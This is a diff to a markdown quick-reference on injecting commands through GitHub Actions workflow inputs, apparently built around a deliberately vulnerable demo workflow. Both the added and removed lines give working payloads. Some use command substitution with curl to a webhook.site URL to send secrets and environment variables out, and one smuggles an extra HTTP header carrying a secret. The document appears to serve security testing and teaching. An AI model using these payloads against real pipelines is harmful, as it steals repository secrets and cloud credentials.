@@ -12,13 +12,13 @@ Quick reference for testing the vulnerability with corrected attack vectors base
 
 ## Working Attack Payloads
 
-### 1. Direct Secret Exfiltration (WORKS - Most Dangerous)
+### 1. Secret Exfiltration via Command Substitution (WORKS - Most Dangerous)
 
-**Target:** `vulnerable.yml` - Pattern 6 (Send notification step)
+**Target:** `vulnerable.yml` - Pattern 6 (Send notification step with secrets in env)
 
 **Package name:**
 ```
-test" -H "X-Stolen-Token: ${{ secrets.DEMO_SECRET }}" -H "X-Fake:
+$(curl https://webhook.site/YOUR-WEBHOOK-ID?token=$API_TOKEN&aws=$AWS_KEY)
 ```
 
 **Package version:**
@@ -27,44 +27,43 @@ test" -H "X-Stolen-Token: ${{ secrets.DEMO_SECRET }}" -H "X-Fake:
 ```
 
 **Expected result:**
-- ✅ The curl command includes an additional header with the secret
-- ✅ Secret sent directly to the endpoint in HTTP headers
-- ✅ Demonstrates that secrets used directly in `run:` are vulnerable
+- ✅ Curl executes during command substitution
+- ✅ Webhook receives GET request with both secrets in query parameters
+- ✅ Demonstrates that secrets in `env:` can be exfiltrated via command injection
 
-**Why it's critical:** When `${{ secrets.SECRET }}` is used directly in a `run:` command alongside untrusted input, an attacker can inject additional shell code that references the same secret **at workflow generation time**. The secret becomes part of the script text itself.
+**Why it's critical:** Even though the workflow uses `env:` to set secrets (which is safer than direct `${{ }}` in run), if the **input** still uses direct interpolation `${{ inputs.package_name }}`, an attacker can inject command substitution that accesses the environment variables.
 
 **Workflow code that's vulnerable:**
 ```yaml
+env:
+  API_TOKEN: ${{ secrets.DEMO_SECRET }}
+  AWS_KEY: ${{ secrets.DEMO_AWS_KEY }}
 run: |
-  curl -X POST "https://hooks.example.com/notify" \
-    -H "Authorization: Bearer ${{ secrets.DEMO_SECRET }}" \
-    -d "package=${{ inputs.package_name }}"
+  echo "Sending notification for package: ${{ inputs.package_name }}"
 ```
 
-**Generated shell script becomes:**
-```bash
-curl -X POST "https://hooks.example.com/notify" \
-  -H "Authorization: Bearer super-secret-api-key-12345" \
-  -d "package=test" -H "X-Stolen-Token: super-secret-api-key-12345" -H "X-Fake:"
-```
+**What happens:**
+1. GitHub expands `${{ inputs.package_name }}` → `$(curl https://webhook.site/...?token=$API_TOKEN&aws=$AWS_KEY)`
+2. Shell executes command substitution, which has access to `$API_TOKEN` and `$AWS_KEY` from env
+3. Secrets are exfiltrated to the webhook
 
 ---
 
-### 2. Command Substitution with Secret Reference (WORKS)
+### 2. GitHub Environment Variable Exfiltration (WORKS)
 
 **Target:** `vulnerable.yml` - Any step with direct interpolation
 
 **Package name:**
 ```
-$(curl https://webhook.site/YOUR-WEBHOOK-ID?token=${{ secrets.DEMO_SECRET }})
+$(curl https://webhook.site/YOUR-WEBHOOK-ID?repo=$GITHUB_REPOSITORY&actor=$GITHUB_ACTOR&ref=$GITHUB_REF)
 ```
 
 **Expected result:**
 - ✅ Curl executes (see progress output in logs)
-- ✅ Webhook receives GET request with secret in query parameter
-- ✅ Proves direct `${{ }}` interpolation allows secret exfiltration
+- ✅ Webhook receives GET request with repository info
+- ✅ Proves command injection works and can exfiltrate environment data
 
-**Why it works:** GitHub Actions generates the shell command with both the input AND the secret expanded at workflow generation time. The `$(...)` causes command substitution, and the secret reference is also expanded, putting the actual secret value into the curl command.
+**Why it works:** GitHub Actions provides default environment variables like `$GITHUB_REPOSITORY`, `$GITHUB_ACTOR`, etc. These are always available in the shell. The `$(...)` command substitution executes before the main command and can access any environment variables.
 
 ---
 
